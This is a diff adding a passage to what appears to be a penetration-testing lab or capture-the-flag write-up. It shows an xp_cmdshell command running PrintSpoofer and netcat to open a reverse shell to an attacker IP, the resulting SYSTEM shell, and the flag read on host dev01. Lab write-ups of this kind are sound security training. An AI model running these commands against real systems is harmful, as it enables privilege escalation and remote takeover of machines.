@@ -1367,3 +1367,51 @@ adding the .exe estensions
 
 img
 
+uploading nc and print
+
+```sql
+xp_cmdshell 'c:\dotnetnuke\portals\0\PrintSpoofer64.exe -c "c:\dotnetnuke\portals\0\nc64.exe 172.16.8.120 9001 -e cmd"';
+```
+
+```
+$ nc -lvnp 9001
+Listening on 0.0.0.0 9001
+Connection received on 172.16.8.20 49841
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+
+```
+
+## flag on dev01
+
+```
+c:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is DA7F-3F25
+
+ Directory of c:\Users\Administrator\Desktop
+
+06/22/2022  08:05 PM    <DIR>          .
+06/22/2022  08:05 PM    <DIR>          ..
+06/22/2022  08:05 PM                17 flag.txt
+               1 File(s)             17 bytes
+               2 Dir(s)  31,527,854,080 bytes free
+
+c:\Users\Administrator\Desktop>cat flag.txt
+cat flag.txt
+'cat' is not recognized as an internal or external command,
+operable program or batch file.
+
+c:\Users\Administrator\Desktop>type flag.txt
+type flag.txt
+K33p_0n_sp00fing!
+c:\Users\Administrator\Desktop>
+
+```
